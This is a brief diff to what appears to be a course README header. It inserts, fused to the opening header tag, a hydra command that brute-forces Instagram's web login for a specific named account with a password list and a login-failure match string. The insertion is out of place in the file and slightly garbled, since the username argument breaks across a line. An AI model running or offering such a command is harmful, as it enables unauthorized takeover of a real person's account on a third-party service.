@@ -1,4 +1,5 @@
-<header>
+hydra -l <_alok__t_.18
+> -P <password_list.txt> instagram.com https-post-form "/accounts/login/ajax/:username=^USER^&password=^PASS^&queryParams=%7B%22name%22%3A%22login%22%2C%22station%22%3A%22web%22%7D=:F=incorrect"<header>
 
 <!--
   <<< Author notes: Course header >>>
